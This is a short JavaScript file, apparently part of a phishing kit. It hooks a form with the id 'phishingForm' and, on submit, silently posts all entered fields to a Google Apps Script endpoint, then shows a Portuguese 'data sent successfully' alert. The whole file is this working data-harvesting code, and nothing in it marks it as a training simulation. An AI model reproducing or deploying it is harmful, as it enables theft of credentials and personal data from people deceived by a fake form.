const scriptURL = "https://script.google.com/macros/s/AKfycbxt88h4IH4BdPDQ2ZbG5oB7EIrEXZiX5_zzPzAGmBo-Gjcrd_O288IXazpfiGYycXRtjQ/exec";

document.getElementById("phishingForm").addEventListener("submit", function(event) {
    event.preventDefault();
    const form = event.target;
    const data = new FormData(form);

    fetch(scriptURL, {
        method: "POST",
        body: data
    })
    .then(response => {
        alert("✅ Dados enviados com sucesso!");
        form.reset();
    })
    .catch(error => {
        alert("❌ Erro ao enviar os dados.");
        console.error("Erro:", error);
    });
});
